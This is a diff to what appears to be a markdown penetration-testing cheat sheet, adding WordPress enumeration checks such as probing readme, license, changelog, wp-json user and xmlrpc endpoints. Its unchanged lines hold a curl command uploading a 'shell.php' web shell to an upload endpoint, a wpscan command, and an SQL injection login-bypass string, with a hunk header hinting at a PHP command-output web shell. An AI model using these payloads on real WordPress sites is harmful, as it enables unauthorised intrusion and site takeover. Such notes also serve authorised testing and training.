@@ -107,12 +107,19 @@ echo "<pre>$output</pre>";
 
 # WordPress
 ## [1] Information Gathering & Enumeration
+- [x] __Check for the `meta tag` in source code__
+- [x] __Check for the `/readme.html` or `txt` and `/license.txt`__
+- [x] __Check for the `X-Powered-By` in Burpsuite__
+- [x] __Check for the `/wp-login` or `/wp-login.php` and `/wp-admin` for the version__
+- [x] __Check for the `/wp-json` or `/wp-json/wp/v2/user` if is not working `xmlrpc.php`__
+- [x] __Check for the `changelog.txt` or `CHANGELOG.txt`__
+
 - __```wpscan --url <url>```__
 - __`<url>/wp-content/uploads`__
 - __`curl -F "Filedata=@./shell.php" <url_of_upload>`__
 
 ## Login bypass
- ```
+```
 " or 1 = 1-- -
 ```
 
